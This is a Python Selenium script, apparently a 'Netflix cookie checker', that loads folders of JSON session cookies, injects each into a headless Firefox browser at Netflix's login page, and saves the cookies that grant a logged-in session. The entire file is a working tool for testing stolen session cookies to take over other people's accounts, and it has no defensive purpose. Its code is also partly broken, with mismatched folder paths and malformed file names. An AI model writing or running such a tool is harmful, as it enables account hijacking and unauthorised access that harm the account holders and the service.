import json
import os
import tkinter
from tkinter import filedialog
import config
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options

working_cookies_path = '/content/Netflix-cookie-checker/json_cookies'

if config.use_folder_selector:
    tkinter.Tk().withdraw()
    folder_path = filedialog.askdirectory()
    if folder_path == '':
        folder_path = 'json_cookies'
        print("Using default path")
    else:
        print(f"Using path: {folder_path}")


def load_cookies_from_json(filepath):
    with open(filepath, 'r') as cookie_file:
        cookies = json.load(cookie_file)
    return cookies


def open_webpage_with_cookies(url, cookies):
    firefox_options = Options()
    firefox_options.headless = True
    driver = webdriver.Firefox(options=firefox_options)
    if config.use_minimized:
        driver.minimize_window()
    driver.get(url)

    for cookie in cookies:
        driver.add_cookie(cookie)

    driver.refresh()

    if driver.find_elements(By.CSS_SELECTOR, '.btn'):
        print(f"Cookie Not working - {filename}")
        driver.quit()
    else:
        print(f"Working cookie found! - {filename}")
        try:
            os.mkdir(working_cookies_path)
            a = open(f'working_cookies/{filename})', 'w')
            a.write(content)
            driver.quit()

        except:
            a = open(f'working_cookies/{filename})', 'w')
            a.write(content)
            driver.quit()


for filename in os.listdir("json_cookies"):
    filepath = os.path.join("json_cookies", filename)
    if os.path.isfile(filepath):
        with open(filepath, 'r') as file:
            content = file.read()

            url = 'https://netflix.com/login'

            try:
                cookies = load_cookies_from_json(filepath)
                open_webpage_with_cookies(url, cookies)
            except:
                print(f"Invalid Cookie - {filename}")
